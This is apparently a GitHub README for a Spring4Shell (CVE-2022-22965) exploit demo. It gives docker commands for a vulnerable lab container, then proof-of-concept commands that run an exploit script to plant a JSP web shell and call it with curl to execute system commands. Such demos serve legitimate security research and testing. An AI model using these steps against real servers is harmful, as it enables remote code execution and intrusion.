# Spring4Shell(CVE-2022-22965)

Spring Framework RCE via Data Binding on JDK 9+ / spring4shell / CVE-2022-22965

# CVE-2022-22965 Exploit Demo

https://user-images.githubusercontent.com/57348147/161458377-44ab2f76-f947-4599-aa0a-92cbaac819f8.mp4

## Build

```bash
docker pull me2nuk/cves:2022-22965
docker run -it -p 8080:8080 --name=spring4shell me2nuk/cves:2022-22965
```

## POC

```bash
python3 -m pip install -r requirements.txt
python3 exploit.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="cmd"
curl http://localhost:8080/cmd.jsp?cmd=id
```

#### References

---

+ [https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
+ [https://github.com/tweedge/springcore-0day-en/blob/main/ANALYSIS_EN.md](https://github.com/tweedge/springcore-0day-en/blob/main/ANALYSIS_EN.md)
+ [https://github.com/lunasec-io/Spring4Shell-POC](https://github.com/lunasec-io/Spring4Shell-POC)